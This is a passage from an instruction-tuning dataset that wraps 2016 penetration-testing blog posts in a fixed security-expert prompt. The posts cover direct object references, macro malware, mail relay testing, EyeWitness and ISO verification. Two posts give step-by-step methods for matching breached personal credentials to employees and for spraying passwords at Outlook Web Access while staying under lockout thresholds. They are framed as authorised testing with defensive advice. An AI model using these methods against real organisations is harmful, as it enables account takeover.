drone from a mix of Italian and Romanian I've not had time to further play with these Conclusions Some things never seem to change The attack that got my friends Git server is described in a blog from 2013 where the author is arguing that things haven't changed since the early 2000s Here we are in 2016 and I'm looking at very nearly the same binaries This attack is a recipe it works in stages and is almost entirely scripted and it will continue being used until it stops working which it clearly hasn't yet"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Let's Talk About Direct Object References</title>\n<taxonomies>Red Team, Web App, Direct Object References, HIPAA, HIPAA violations, user profiles, XKCD</taxonomies>\n<creation_date>Wed, 10 Feb 2016 21:44:54 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Kelsey Bellew Maybe you don't know what Direct Object References mean if you Google it you'd get this This description uses the words direct object and reference to describe a direct object reference That's never a good sign Let's approach this from a different angle Say there's a website Say there are users on this website Say each of these users have an ID number and that a given user Bob has the ID of 123 Say when you view the user Bob the URL looks like this ww.somesitewithusers.com users 123 That's a direct object reference Rephrased 123 is referencing Bob who is a user The user in this case would be the object So a direct object reference If you change 123 to 124 the web site might show you a different user If it does and it's not a user you were suppose to be able to see then this is an insecure direct object reference Here's a real-world example The 1133 I have outlined in red is a direct reference to this specific comic If you change the number you change the comic you're looking at Proof I changed 1133 to 113 and got a different comic So okay you think you get it The object here is the comic the reference is the number 1133 or 113 So is this one of those Insecure Direct Object References Is there any reason you shouldn't be able to see this comic Or any other comic you could reach using this method that you couldn't in some other way If you pay attention while you're navigating this web site you'll notice that every time you hit the Next button that number goes up by one The 113 turns to 114 If you push the Prev button 113 turns to 112 Because they go in order there won't be any pages you can get to by changing the number in the URL that you couldn't get to by pushing one of the buttons on the page Let's go back to the first example where there's a website with users Let's say that instead of viewing Bob's profile you click the button to edit your profile You see that the URL changed to this ww.somesitewithusers.com edituser 122 Well that looks interesting See that 122 Why does it have a number when you're editing your profile The somesitewithusers.com is the site The edituser is probably because you clicked on a button that said Edit Profile But why 122 Remember Bob His number was 123 which you saw when you were viewing his profile What if you change the 122 after edituser to 123 click enter Hey look it's Bob And you see a button to change his name change his username maybe change his email and password And then you can save the changes Next time you look at Bob's profile it has all the changes you made to it So hey that seemed insecure definitely something the website should not have allowed you to do This won't happen everywhere Even if you notice a number that's referencing a user and you change it to another number the website can check your credentials to see if you should have access to that page and then deny you access The website still utilizes direct object references but those direct object references are not insecure So let's recap The definition Google gave us was the following ...a direct object reference occurs when a developer exposes a reference to an internal implementation object such as a file directory or database key Without an access control check or other protection attackers can manipulate these references to access unauthorized data The developer is the person who made the website The internal implementation object would be something like a user or a comic The only reference we talked about was a number in the URL but the reference can be other things as well and in other places It could have been the name of the comic or some unique piece of information in the user file maybe their username or email The reference could have been in a HTTP Request Accessing unauthorized data would refer to someone doing something like changing Bob's profile without being logged in as Bob What if you can't make any changes to some page you find like the comic example above Is it ever insecure then If you can't make changes then what's the problem Here's one problem HIPAA If instead of being able to change Bob's profile you can just learn what his email and home address are that's one thing It's a bad thing But let's say you're in a web application with patient information You can only click on patients within your hospital database but then you notice when you click on patient records you know were created sequentially but the numbers in the URL are 124466 and 124470 That doesn't look right so you change it to 124467 to see what's up Instead you end up viewing documents on a patient who isn't in your hospital That's a much worse thing All because of the way the developer decided to store the data You couldn't click on the patient because it wasn't within your range of access but even so nothing is stopping you from incrementing twelve hundred thousand patient records That's a violation of HIPAA and that's very illegal There are many other kinds of direct object references insecure and otherwise There are good reasons to utilize direct object references comics and there are good reasons to absolutely never use direct object references patient information Think about it the next time you see what seems to be arbitrary numbers in a URL ______ ww.youtube.com watch?v ydrtF45-y-g"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Warning: This Post Contains Macros</title>\n<taxonomies>How-To, InfoSec 101, Average User, BlackEnergy, Education, macros, MS Office, Ukraine</taxonomies>\n<creation_date>Thu, 11 Feb 2016 21:45:54 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Lisa Woody On the 23rd of December a cyber attack left hundreds of thousands of people in the Ukrainian region of Ivano-Frankivsk without power This was the first confirmed incident of cyber attackers taking down a power grid Various reports have since indicated that this was a coordinated sophisticated effort which employed a trojan called BlackEnergy As someone born and raised in Ukraine this hit close to home for me I have since read reports on BlackEnergy and this attack both by Ukrainian Russian and American companies and I couldn't help but notice something Macros in Microsoft Office documents A simple Google search will show that BlackEnergy has been utilized in Ukraine for the last two years now frequently for espionage against government targets While the actual implementation requires skill customization advanced coordination more than a little programming ability the delivery method was always the same macros in MS Office documents Ukrainian Excel Document with a Macros Warning Macro malware has been around since the 90s and has recently grown in popularity Office applications run internal macros written in Visual Basic for Applications VBA VBA macros are intended to make your job easier automating repetitive and time consuming tasks within the office document However VBA features like the ability to automatically download files and run applications should trigger red flags for potential abuse Mix these features with a little social engineering such as an urgent email containing a malicious spreadsheet and delivering malware into a network becomes a simple task Every organization is comprised of peripheral employees whose day to day tasks involve using email editing documents and being on a computer with access to the company network Most people know not to to download and run .exe files Microsoft office documents are different Despite nearly 20 years of these types of attacks employees are expected to open MS documents when they receive them especially when they appear to be coming from someone in their organization It's almost too easy Before trying to implement complicated strategies against complex software companies should mount a concerted effort to educate their employees about these ancient simple but extremely effective malware delivery mechanisms In the world of information security it's the simple and overlooked things that cause big problems That is why we strive to not only find vulnerabilities in our tests but also to educate those who could encounter these threats on a daily basis through our user awareness training Afterall a little knowledge about these simple threats could go as far as preventing a city wide power outage Many are convinced that Russia is behind the attack and will continue to engage Ukraine in a similar fashion But even outside of Eastern Europe cyber incursions like this one targeted towards low level employees with very little information security knowledge are sure to become a primary aspect of future warfare Delivery mechanisms for malware will rely on social engineering leaving countries with a high level of corruption to be at the greatest disadvantage While there will always be sophisticated attackers out there who come up with complex malware this particular attack was brilliant in its simplicity Let's make it a little bit harder for bad guys to attack us ______ Lisa originally from Ukraine is a software engineer at BHIS and in her free time enjoys rock climbing on the awesome routes in the Black Hills of South Dakota Read more about her here Who Wouldn't Want Their Network to Become a Viral Fishtank"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Exploiting Password Reuse on Personal Accounts: How to Gain Access to Domain Credentials Without Being on a Target's Network: Part 1</title>\n<taxonomies>Author, Beau Bullock, External/Internal, Password Spray, Red Team, domain creds, exploiting passwords, gaining access to domain credentials, passwords, reusing passwords</taxonomies>\n<creation_date>Mon, 15 Feb 2016 21:51:55 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Beau Bullock In this series of posts I am going to detail multiple ways to gain access to domain user credentials without ever being on a target organization's network The first method involves exploiting password reuse issues where a user might have reused the same password they used for their corporate domain account on another external service The second method is what I think is a far more interesting way of gathering user credentials that involves discovering a target organization's username schema followed by password spraying user accounts against an externally facing service that is hosted by the target organization for example an Outlook Web Access portal Other methods will follow these posts In part 1 I will detail how an attacker can gain access to corporate domain account credentials by taking advantage of password reuse by an employee on their personal accounts This Article Does Not Involve Sticky Notes Credential Reuse on Personal Accounts Individuals that reuse the same password on multiple web services is a very huge issue Many people will use the same password for many different services out of the ease of remembering multiple logins across the web The problem with this is that if a website is compromised and a user reused the same password for their personal account and their corporate account then potentially an attacker who has gained access to the personal credential now has access to corporate account credential Very commonly when we start to analyze credential leaks for a target organization we typically tend to just look at the domain name owned by the organization By only looking at the target organization's domain name one will only gain access to credentials where a target user has used their corporate email address to sign up for an external service A far more interesting way to go about looking for user credentials involves attempting to locate corporate employees personal accounts that have been part of a third-party compromise This can be a very difficult task provided the many services that are available for users to sign up for email Yahoo Gmail etc The difficulty of locating a user's personal account can be decreased when the target organization itself has a service that offers personal accounts For example think about an organization like Google who has gmail.com It's safe to think that employees of Google potentially have a gmail.com account On a recent engagement I had the opportunity of testing a company that also offered a similar service where they offer email addresses to their customers Pwnedlist.com is one of a few sites that collects the information dumped publicly from various data breaches They have a service that allows users to submit email addresses and determine if that address was associated with a data breach Pwnedlist also accepts domain names When submitting a domain name to Pwnedlist the site will tell you how many accounts from that target domain were part of various breaches When I ran the target organization's domain through a Pwnedlist.com search I found the domain used by the customers of the target organization had over 50 000 accounts that were part of various data breaches as recent as a few days before I began the assessment I spoke with the target organization about the potential of their own employees having accounts that were technically personal accounts they set up as a customer of the target organization They were in agreement that this was a possibility The organization was rightly interested in which of their customers have been part of a data breach and they requested that I provide this data I proceeded to gather this information from Pwnedlist This got me thinking about the potential for analyzing and correlating whether an employee's personal account credentials that are part of a previous compromise align with their actual corporate account credentials Could I actually cross reference a user's personal account credential back to their corporate account and potentially login using the same credentials that they used on their personal account Just to clarify I am not attempting to login to or utilize an individual's personal account The goal is to see if the password they used on a third-party site that was part of a breach was reused on their corporate account login After gaining access to 50 000 personal email addresses and potential credentials for those personal email addresses one must then find a way to relate those email addresses to actual people and then potentially relate them to corporate email addresses The problem with sites that allow users to create their own email address is that the address name is at the discretion of the user So in my case I ended up getting credentials from Pwnedlist for accounts that looked similar to Alpacas4Eva targetorg.net In order to determine whether Alpacas4Eva targetorg.net belongs to an actual employee of the target organization one needs to be able to take that email address and figure out who exactly it belongs to To do this I used the Pipl.com search engine Pipl.com will accept an email address and provide a ton of information that they have gathered from many different social media and news sites around the web For example you can submit an email address and they might be able to provide details they gathered from sites like LinkedIn Facebook etc This information generally will include a full name of a person if they posted it somewhere on the Internet Also a 'Career field potentially details where someone has said they work somewhere on the Internet maybe on LinkedIn Using Burp Suite's Intruder functionality sidenote I'm working on turning this into a Recon-ng module I submitted over 50 000 email addresses that were technically personal email accounts of customers of my target organization to pipl.com's search engine I then grepped the responses from Pipl for the 'Career field looking for the title of the company itself On the Options tab of Burp Intruder you can add in custom fields to grep for I removed all of the other default fields and added in the company name of the target organization Burp now tells us whether the response contained the company name or not This helps us narrow down the possible matches for employees Managers never reuse their passwords right Out of the 50 000 email addresses that I submitted to Pipl I actually ended up with 252 hits that appeared to be employee's personal accounts After finding these 252 potential personal accounts of employees the task then becomes to convert them into the organization's email standard If Pipl was able to find the full name of the individual whose personal email account I submitted was associated with then it shouldn't be too difficult to mangle their name into a corporate email address i.e firstname.lastname targetorganization.net For this particular target organization I was able to find other valid email addresses during reconnaissance so it was very easy for me to discover the schema I was able to then convert what appeared to be personal employee accounts to corporate email account addresses I also had credentials for these accounts from Pwnedlist The next step was to simply go attempt to login to an external portal like Outlook Web Access with these credentials that were part of a third-party breach If an employee of the target organization had reused the same password they used for their personal account then we now have access to a valid domain account ....and we're in to Mr John Doe's email Just to recap the steps of this approach to gathering user credentials follows Gather credentials of personal accounts associated with a target organization through public data breaches Sites like Pwnedlist host services for gathering these Submit these personal email addresses to Pipl and grep the results for the company name This is to help locate individuals who said they work at the target company on the Internet and Pipl was able to correlate a personal account to them After crafting a list of potential employee's personal accounts use the information gathered about them from Pipl to craft potential corporate email accounts Potentially you now have email addresses and passwords of corporate accounts if credential reuse was occurring Recommendations Introduce your users to password managing services The best defense against this is to make your users stop using the same passwords everywhere In the next part of this two-part article I will detail how an attacker can discover a target organization's username schema and perform password spraying attacks against an externally facing service You can read it HERE"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Password Spraying Outlook Web Access - How to Gain Access to Domain Credentials Without Being on a Target's Network: Part 2</title>\n<taxonomies>Author, Beau Bullock, Recon, Red Team, domain credentials, domain creds, password spraying, passwords</taxonomies>\n<creation_date>Wed, 17 Feb 2016 21:54:48 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Beau Bullock This is part two of a series of posts See part 1 here where I am detailing multiple ways to gain access to domain user credentials without ever being on a target organization's network The first method involves exploiting password reuse issues where a user might have reused the same password they used for their corporate domain account on another external service The second method is what I think is a far more interesting way of gathering user credentials that involves discovering a target organization's username schema followed by password spraying user accounts against an externally facing service that is hosted by the target organization for example an Outlook Web Access portal Other methods will follow these posts In part 2 I will detail how an attacker can discover a target organization's username schema and perform password spraying attacks against an externally facing service The Dangers of Metadata and Publicly Facing Authentication Services Very commonly on assessments we tend to look for documents that are hosted by a target organization and are publicly available to download The reason we do this is that we find that very commonly organizations do a very bad job of scrubbing the metadata attached to the items they post publicly Some very interesting things can be found in the metadata that gets attached to files For example if you take a photo with your cell phone and you have GPS enabled many times that GPS location information will be attached to the picture itself From an operational security perspective if you were to take a photo of a secure location and have GPS enabled then posting that picture online might reveal the actual coordinates of the location you took the photo New Profile Pic When we look at analyzing metadata of Word documents Excel files PDFs PowerPoint presentations and more that organizations post publicly we find very often that we can actually gain access to computer names folder structures as well as user names of those that created the files themselves A great tool for quickly finding metadata and analyzing it in publicly available files of a target organization is called FOCA You can download FOCA here ww.elevenpaths.com labstools foca index.html FOCA simply performs Google and Bing searches with the filetype parameter You can provide Google with a search like the following to search for all of the PDF files associated with the targetorganization.net domain site targetorganization.net filetype doc If you provide FOCA a target domain it starts with the top-level domain and will subsequently find other subdomains where potential files are located FOCA will then download any of these files and analyze the metadata attached to the files On a recent engagement I ran FOCA against the domain of the target organization that I was testing When I looked at the metadata that FOCA was able to gather from the files that were being hosted publicly I found a large number of what appeared to be user names In fact I was able to discover what appeared to be their actual naming convention This naming convention did not appear to be random or hard to guess at all What I mean by that is that I was able to very easily craft a list of every possible combination of their username schema For example imagine a username schema that starts out each username with the word 'emp and then simply appends the three-letter initials of the employee abc So a possible full username would be 'empabc The total number of three-character permutations of the letters 'a through 'z is 17 576 So to hit every possible username combination from 'empaaa through 'empzzz is 17 576 I generated a list containing each of the possible permutations Password Spraying Outlook Web Access So now that I had a list of possibly every username combination for the target organization what could I do next as an external attacker Next an external attacker would have to locate some sort of external service that performs domain-based authentication One such service that does this that we find very often is Microsoft's Outlook Web Access OWA Organizations provide the ability for their employees to access their email remotely through services like OWA The authentication that happens when a user logs into OWA is typically domain-based meaning that the credential used to authenticate is checked against the domain for validity After locating an external OWA portal an attacker could brute force passwords but will quickly lockout accounts if a lockout threshold is in place A far more superior way of performing password attacks is called password spraying Password spraying involves attempting to log in with only one very strategically chosen password across all of the domain accounts This allows an attacker to attempt many more authentication attempts without locking out users For example if I were to attempt to login to every account with the password 'Winter2016 it is very likely that someone at the target organization used that password and I will now have access to their account Some things to consider when performing an external password spray attack Be extremely mindful of lockout thresholds If you submit too many bad passwords in a given amount of time you are going to lock accounts out Without being on the target network it is impossible to know exactly what the domain account policy enforces That being said by default Windows default domain account policy does not enforce a lockout of any kind This means that technically you could brute force any user's password without locking them out I have yet to run into an environment that does not have some sort of lockout policy Very commonly I find that environments set their lockout policy to five 5 failed logins within a 30-minute observation window Just use one password for spraying every two hours This is a reasonable window that will likely not get you into a situation where you are locking out accounts Be in close contact with your point of contact at the company to verify you are not locking anyone out I once again used Burp Suite's Intruder functionality to submit one login attempt for each possible username using one password Performing a password attack in this manner limits the risk of locking out accounts as only a single login attempt is performed for each account For example BHIS submitted the userID 'targetorg empaaa with a password of 'Winter2015 After this attempt the same password would be tried with 'targetorg empaab and continue on all the way to 'targetorg empzzz To do this I first setup Burp Suite to intercept all of the requests leaving my browser I attempted to login to the OWA portal with a userID of 'targetorg test and a password of 'Testing123 The POST request to the OWA portal looked like the following I then sent this request to Intruder For this first example we will leave the attack type as 'Sniper In Burp Intruder I specified only one payload position The username is all that is going to change during the attack so this is where we add the payload position The password will remain 'Testing123 or whatever you set it to be I highly recommend season and year like 'Winter2015 On the payloads tab I now imported the list of probable usernames I generated One thing I noticed was that Outlook Web Access responds to the POST request by simply setting a cookie in the browser and redirecting to the root page OWA did this for every login attempt regardless of whether the login was valid or not So in order for Burp to follow through with the authentication process we need to set one more setting before launching the attack On the Options tab of Burp Intruder at the very bottom select the option to Follow redirections for On-Site only Also click the checkbox to Process cookies in redirections Starting the attack now one can see where Burp Intruder is following each of the redirects that occur during the authentication process to OWA The only thing left to do is to sort by the length of the response as valid authentication attempts responded with a shorter response length In the screenshot below OWA redirects four times before hitting a page indicating a successful login I ultimately was able to gain access to a large number of accounts via this technique As can be seen in the screenshot below the requests that generated a response length of around 4371 and 1630 were valid user credentials The requests that generated a response length of 12944 were failed login attempts In the scenario I've demonstrated above I was utilizing the 'Sniper functionality in Burp This was mainly to avoid account lockout and only change the userID field Being in close contact with my target organization I knew what the actual lockout threshold was as well as the observation window In order to maximize the effectiveness of my password spraying I utilized Burp Intruder's Cluster Bomb attack With the Cluster Bomb attack you can specify two payload positions I selected the username and password fields as my payload positions Cluster Bomb will also allow you to specify two lists to use with each payload position So I left the username position the same as previously with my list of potential users I then crafted a list of 10 or so passwords that I thought would work nicely to password spray with The Cluster Bomb attack will now iterate through all of the usernames with one of these passwords at a time Once the spray is done for one password it will move onto the next For example the spray would go through the entire username list with a password of Winter15 then after that spray is finished it would move onto Winter16 With my list of 17575 usernames the time it took to spray the entire list with one password was far out of the observation window in terms of lockout so I didn't have anything to worry about there In the example I gave above I was currently assigned to perform an external network assessment and an internal pivot assessment for the target organization After password spraying externally over the weekend before I was scheduled to begin the internal pivot assessment I gained access to a total of 130 valid user credentials The target organization did not detect any of the password spraying activity through their external portal It is probably safe to say that an attacker could password spray for weeks on end gaining access to many more accounts via this technique In this post I focused on password spraying against OWA specifically There are many other services that this same type of attack could apply to For example an attacker can perform password spraying attacks against Microsoft RDP servers SMTP servers SSL VPNs and more A great tool for doing this against most of these services is called Patator and can be found here ithub.com lanjelot patator Just to recap the steps of this approach to gathering user credentials follow Locate publicly available files with FOCA on websites of the target organization Analyze the metadata from those files to discover usernames and figure out their username convention Craft a list of their entire possible username space Password spray against an external system that performs domain authentication like Outlook Web Access using the username list you generated Profit Recommendations Analyze all of the documents your organization is hosting publicly for information leakage via metadata Implement policies and procedures to scrub the metadata from anything that is going to be posted publicly Watch your OWA and any other external authentication portals for multiple failed login attempts and password spraying activity Create stronger password policies beyond the default 8 characters we typically recommend 15 or more Force users to use two-factor authentication In the event someone does password spray a user if two-factor authentication is enabled they won't gain access to much"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Test for Open Mail Relays</title>\n<taxonomies>External/Internal, Red Team, Carrie Roberts, external network assessment, mail relays, mail servers, pen-testing, penetration testing, Pentesting, testing for open mail relays</taxonomies>\n<creation_date>Thu, 18 Feb 2016 22:00:30 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Carrie Roberts Guest Blog It is important to ensure that your external mail servers are properly configured to not support open relaying of mail An open mail relay can be abused by spammers eating up your resources and landing you on a blacklist It is not too common to find completely open mail relays these days because they get abused thus inspiring them to be fixed But what is common is to find is what I call a Partially Open Mail Relay This occurs when the mail relay can be used to do one of the following Send email from an external source address to an internal destination address Send email from an internal source address to an internal destination address This is quite useful for an attacker developing an email phishing campaign against internal users Imagine an email to all employees appearing to come from the CSO Exploiting the partially open mail relay makes the email appear genuine so that employees have no visual indication that this is not truly from the CSO If the employee's email client is telling them it came from the CSO and the source email address confirms this they are more likely to trust that it actually did None of the usual this is a phish clues such as the use of a look-a-like domain name are present Unfortunately vulnerability scanners do not do a good job of detecting this vulnerability if they even detect it at all So to be sure you need to test it yourself and this is how you can do it Use a telnet or netcat client to connect to the mail server port There is a gotcha here to watch out for The mail server port is typically port 25 and many home Internet Service Providers block this port This means that when you try to connect it will time out Two examples of failing to connect for this reason are shown below The first is an attempt with the telnet client and the second is an attempt to connect with the netcat client You can check if your port 25 is open for communication on windows with the following PowerShell command powershell New-Object System.Net.Webclient .DownloadString 'pen.zorinaq.com 25 If you get a response other than Yep port 25 is open you may have filtering going on and you'll need to do this testing from a different network location Now that we know we can communicate on port 25 we can use the following commands to test for open mail relays In the example below the blue text shows what you should enter on the command-line and green text shows the command output or server response The commands above are just an example and as it turns out a bad one for testing open mail relays This is because example.com is actually a special case configured into some mail servers for testing It will pretend to accept the message for delivery but it actually doesn't So when you want to test on open mail relay use a different domain than example.com The first thing you should check is if mail can be relayed from an external email address to an external email address as shown below Test External Source Address External Destination Address MAIL FROM RCPT TO Next check to see if you can relay mail using an external source email address and an internal destination address Test External Source Address Internal Destination Address MAIL FROM RCPT TO Last check to see if you can relay mail using an internal source email address and an internal destination address Test Internal Source Address Internal Destination Address MAIL FROM RCPT TO You should repeat this last test to ensure you have used both an existing internal source address and a non-existing internal source address This is because some mail servers may be configured to require authentication for an existing user but it may be possible to bypass this protection by using a non-existent internal source address such as does.not.exist blackhillsinfosec.com in our example Check this on all your mail servers as each may be configured differently This is how you can use the Linux dig command to list the mail servers for your domain Or for Windows try nslookup dig 8.8.8.8 blackhillsinfosec.com -t MX There is also a Metasploit module that can test for mail relaying here And finally here are some suggestions for how to remediate any issues you find The simple answer is to configure your mail server to not relay mail but business requirements may require mail relaying from trusted third parties In this case consider implementing one of the following controls with the first being the preferred solution Require authentication with user accounts and encryption through STARTTLS Configure the email gateway to only allow the IP addresses of the email gateways themselves and authorized IP addresses to send"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>EyeWitness and Why It Rocks</title>\n<taxonomies>Author, Brian Fehrman, External/Internal, Red Team, EyeWitness, Pentesting, vulnerability scans</taxonomies>\n<creation_date>Mon, 22 Feb 2016 22:02:58 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Brian Fehrman External and Internal vulnerability scans are often part of any penetration test Automated scanning tools however can't always find the good stuff Many times some of the worst things that we find are in the results marked as Low-Severity or Informational in nature It can be as easy as just visiting a web service that is exposed and finding that the default credentials haven't been changed As an attacker why bother exploiting a system when they can just login with credentials that were found with a quick Google search How about systems with no authentication For larger scans it might not be feasible to manually visit every web service that is exposed That is where tools like EyeWitness come in There are other tools that perform similar tasks such as RAWR and Peeping Tom I encourage you to check those out as well I am in no way biased towards EyeWitness other than that is what I picked up and it does everything that I would like It allows you to feed in a list of web addresses or more often for me a Nessus file directly exported from a Nessus server It will automatically visit the web services that were found take screenshots and generate a nifty report for you in HTML format All you have to do is scroll through the report and see which websites look interesting It's very helpful in quickly finding the good stuff To use EyeWitness on a Kali box start by cloning the repository Enter the directory and run the setup file If you want to feed in a Nessus file first export it from your Nessus server to a .nessus format Move the Nessus file onto your Kali box I like to put it in the EyeWitness directory Then issue the command to process the file I run it with a timeout of 30 seconds 15 threads and tell it to use Selenium to perform the screenshots --web flag Below is a sample of the report that is generated As you can see this can be extremely valuable for both pentesters and network administrators Quickly find the good stuff or determine just what is running on your network Join the BHIS Blog Mailing List get notified when we post new blogs webcasts and podcasts jetpack_subscription_form show_only_email_and_button true custom_background_button_color undefined custom_text_button_color undefined submit_button_text Subscribe submit_button_classes undefined show_subscribers_total true"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Check Your Image</title>\n<taxonomies>How-To, Image, Linux, Linux Mint, Vulnerabilites</taxonomies>\n<creation_date>Wed, 24 Feb 2016 22:06:41 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Lawrence Hoffman Today I'll walk through the process I use to verify ISO images before I install them If you downloaded Linux Mint 17.3 Cinnamon on February 20th there's some chance that you obtained an ISO with malware installed The Linux Mint team posted notification on their blog on February 21st at around 2 00 am that they'd discovered their website had been compromised and that the official package had been replaced by a malicious version of the operating system The hacked ISO was being hosted at absentvodka.com and there are a few names related to the Bulgarian based website which the Mint team has said they may launch investigation against Following the attack the site was brought down so as to avoid serving malicious ISO files In comments on the original announcement members of the Mint team identified the site's Wordpress blog as the attacker's point of entry Prior to the announcement a dump of the linuxmint.com website was made available on TheRealDeal for 85 At least one individual purchased this and posted the config files on HackerNews For the intensely curious the malicious code is available in this gist ist.github.com Oweoqi 31239851e5b84dbba894 it appears to set up a bot net So how can the user avoid this kind of threat Well first off is the recognition that regardless of the technical knowledge professionalism and good intentions of those providing a product we must assume that the product could possibly be compromised For those reasons it is on the consumers to take whatever steps we can to verify that the product we're obtaining is the product we think it is There are a few steps that I typically take to verify operating system images before use What follows is pretty paranoid and uses an Arch Linux distro as an example My goal here is twofold one know the system I'm installing and the current issues and two get multiple independent verifications that what I'm about to install is legitimate Be aware of what vulnerabilities are known for the OS you're considering installing Arch Linux lists their CVEs here iki.archlinux.org index.php CVE most big distros do this I also use CentOS for that I check CVEs here ccess.redhat.com security security-updates Reading through we can see that both have some unpatched at the time of this writing namely the glibc vulnerability that has been in the news as of late.Next is the checksum We can download our file now for Arch Linux there's a huge number of mirrors usually I select one in the United States and have a look at who the hosting party is In this case I'll choose kernel.org Once over to kernel.org we see that we're actually in a directory containing the images and the signatures and another set of checksums In this case I'll download the x86_64 tarball from kernel.org Call me paranoid but what if a malicious entity had obtained access to both kernel.org and Arch Linux probably unlikely but not impossible so rather than downloading the signatures and checksums from kernel.org I'll go over to aggregate.org another mirror on the list and download the SHA1 sums there This is what the sha1sums.txt contains Okay Now let's check em I simply grep for the sha1sum from the file and I can see that they do in fact match A similar command can be run to check the md5 sum Note that before checking the MD5 I went and got that file from yet another download mirror this time pair.com Finally we'll check the signature Moving to another site in the mirror list I pick up the signature to check it This time I selected ocf.berkley.edu and downloaded the signature file to my local machine As seen above I first attempted to check the sig with gpg --verify it assumed the correct file to check and couldn't find the key in my gpg keychain So I imported the key with gpg --recv-keys and the key id The rerun shows that the signature is in fact verified You can see a time break between when I first attempt verification and when I pull the key during that time I was googling the key id to see if there were any fishy results So now we can move on with the installation of our ISO I also recommend that if an integrity check is available for your installation media you run that before install Arch Linux is a rolling distribution so I go through this kind of verification each time I do an install With other OSs like CentOS Ubuntu etc which are versioned I will usually download one image verify it and then encrypt it and back it up so that I have a known good image to install from in the future for that particular version Bonus section For work when I'm super paranoid and the image is some new hacking tool or something we're testing out for another company I'll actually start the image in an airgap then plug it into a mirrored switch and pull all of the traffic off of it for a while to see if it attempts to map drives ping outbound to someone else's network or go grab software I didn't ask for Beau Bullock has also mentioned to me that he likes to run a vulnerability scan on it after install which will point out which components of the system may be misconfigured from an outside perspective This makes a lot of sense it doesn't have to mean that the image was intentionally made malicious just that someone forgot to update package x before signing off on the image"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Check Your Tools</title>\n<taxonomies>Author, Brian King, Password Spray, Red Team, bad passwords, password, passwords</taxonomies>\n<creation_date>Fri, 26 Feb 2016 22:10:27 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
